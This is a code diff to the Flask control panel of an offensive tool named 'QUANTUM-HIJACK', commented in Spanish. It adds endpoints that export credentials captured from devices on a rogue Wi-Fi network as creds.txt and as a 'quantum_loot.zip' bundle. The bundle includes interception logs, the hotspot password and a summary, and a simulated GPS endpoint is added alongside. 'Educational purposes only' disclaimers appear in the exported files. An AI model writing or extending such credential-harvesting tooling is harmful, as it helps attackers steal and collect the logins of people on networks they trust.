@@ -13,17 +13,18 @@ import time
 import json
 import re
 import socket
+import random
+import zipfile
+from io import BytesIO
 from datetime import datetime
 from pathlib import Path
-from flask import Flask, render_template, jsonify, request
-from flask_cors import CORS
+from flask import Flask, render_template, jsonify, request, Response, send_file
 
 # ═══════════════════════════════════════════════════════════════════════════
 # CONFIGURACIÓN
 # ═══════════════════════════════════════════════════════════════════════════
 
 app = Flask(__name__, template_folder='templates')
-CORS(app)
 app.config['JSON_SORT_KEYS'] = False
 
 # Rutas de archivos
@@ -466,6 +467,140 @@ def api_export():
         pass
     
     return jsonify(export_data)
+
+@app.route('/api/download/creds', methods=['GET'])
+def download_creds():
+    """Descargar credenciales como creds.txt"""
+    credentials = read_credentials()
+    
+    content = "╔═══════════════════════════════════════════════════════╗\n"
+    content += "║  🔓 QUANTUM-HIJACK - CREDENCIALES CAPTURADAS        ║\n"
+    content += "║  Emmanuel - 2026                                     ║\n"
+    content += "╚═══════════════════════════════════════════════════════╝\n\n"
+    
+    if not credentials:
+        content += "⚠️  No se capturaron credenciales aún.\n"
+    else:
+        content += f"📊 Total capturadas: {len(credentials)}\n"
+        content += f"⏰ Generado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+        content += "="*60 + "\n\n"
+        
+        for i, cred in enumerate(credentials, 1):
+            content += f"[{i}] {cred.get('timestamp', 'N/A')}\n"
+            content += f"    Protocolo: {cred.get('protocol', 'N/A')}\n"
+            content += f"    Target: {cred.get('target', 'Desconocido')}\n"
+            content += f"    Origen IP: {cred.get('src_ip', 'N/A')}\n"
+            content += f"    Destino: {cred.get('dst_ip', 'N/A')}:{cred.get('port', 'N/A')}\n"
+            
+            creds_data = cred.get('credentials', {})
+            if creds_data:
+                content += "    Credenciales:\n"
+                for key, value in creds_data.items():
+                    content += f"      • {key}: {value}\n"
+            
+            content += "\n" + "-"*60 + "\n\n"
+    
+    content += "\n⚖️  AVISO LEGAL:\n"
+    content += "   Este archivo es para propósitos educativos únicamente.\n"
+    content += "   Uso no autorizado puede violar leyes locales.\n"
+    
+    log_operation(f"Credenciales descargadas: {len(credentials)} registros", "INFO")
+    
+    return Response(
+        content,
+        mimetype="text/plain",
+        headers={"Content-Disposition": "attachment;filename=creds.txt"}
+    )
+
+@app.route('/api/download/all', methods=['GET'])
+def download_all():
+    """Descargar todo como quantum_loot.zip"""
+    try:
+        zip_buffer = BytesIO()
+        
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            # 1. Credenciales en TXT
+            creds_response = download_creds()
+            zipf.writestr('creds.txt', creds_response.get_data(as_text=True))
+            
+            # 2. Export JSON completo
+            export_data = api_export().get_json()
+            zipf.writestr('export_completo.json', json.dumps(export_data, indent=2))
+            
+            # 3. Archivo de credenciales JSON (si existe)
+            if os.path.exists(CREDENTIALS_FILE):
+                with open(CREDENTIALS_FILE, 'r') as f:
+                    zipf.writestr('captured_credentials.json', f.read())
+            
+            # 4. Logs de operación (si existe)
+            if os.path.exists(OPERATION_LOG):
+                with open(OPERATION_LOG, 'r') as f:
+                    zipf.writestr('operation_logs.json', f.read())
+            
+            # 5. Resumen ejecutivo
+            summary = "═══════════════════════════════════════════════════\n"
+            summary += "  🔓 QUANTUM-HIJACK - RESUMEN EJECUTIVO\n"
+            summary += "═══════════════════════════════════════════════════\n\n"
+            summary += f"📅 Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            summary += f"📱 Dispositivos conectados: {len(get_connected_clients())}\n"
+            summary += f"🔓 Credenciales capturadas: {len(read_credentials())}\n"
+            summary += f"🌐 WiFi SSID: {state['ssid']}\n"
+            summary += f"🔑 Password: {state['password']}\n"
+            summary += f"📡 Gateway: {state['gateway_ip']}\n\n"
+            summary += "ARCHIVOS INCLUIDOS:\n"
+            summary += "  • creds.txt - Credenciales formato legible\n"
+            summary += "  • export_completo.json - Datos completos\n"
+            summary += "  • captured_credentials.json - Log interceptor\n"
+            summary += "  • operation_logs.json - Logs servidor\n"
+            summary += "  • RESUMEN.txt - Este archivo\n\n"
+            summary += "⚖️ SOLO PARA FINES EDUCATIVOS\n"
+            
+            zipf.writestr('RESUMEN.txt', summary)
+        
+        zip_buffer.seek(0)
+        
+        log_operation(f"Descargando quantum_loot.zip completo", "INFO")
+        
+        return send_file(
+            zip_buffer,
+            mimetype='application/zip',
+            as_attachment=True,
+            download_name='quantum_loot.zip'
+        )
+    
+    except Exception as e:
+        log_operation(f"Error generando ZIP: {e}", "ERROR")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/gps', methods=['GET'])
+def api_gps():
+    """GPS simulado basado en ubicación"""
+    CITIES_GPS = {
+        'Varsovia': {'lat': 52.2297, 'lon': 21.0122, 'country': 'Polonia'},
+        'Cracovia': {'lat': 50.0647, 'lon': 19.9450, 'country': 'Polonia'},
+        'Gdańsk': {'lat': 54.3520, 'lon': 18.6466, 'country': 'Polonia'},
+        'Wrocław': {'lat': 51.1079, 'lon': 17.0385, 'country': 'Polonia'},
+        'Poznań': {'lat': 52.4064, 'lon': 16.9252, 'country': 'Polonia'},
+    }
+    
+    # Seleccionar ciudad aleatoria
+    city = random.choice(list(CITIES_GPS.keys()))
+    coords = CITIES_GPS[city]
+    
+    # Añadir variación pequeña para simular movimiento
+    lat_offset = random.uniform(-0.01, 0.01)
+    lon_offset = random.uniform(-0.01, 0.01)
+    
+    gps_data = {
+        'city': city,
+        'country': coords['country'],
+        'lat': round(coords['lat'] + lat_offset, 6),
+        'lon': round(coords['lon'] + lon_offset, 6),
+        'accuracy': random.randint(10, 100),
+        'timestamp': datetime.now().isoformat()
+    }
+    
+    return jsonify(gps_data)
 
 # ═══════════════════════════════════════════════════════════════════════════
 # MAIN
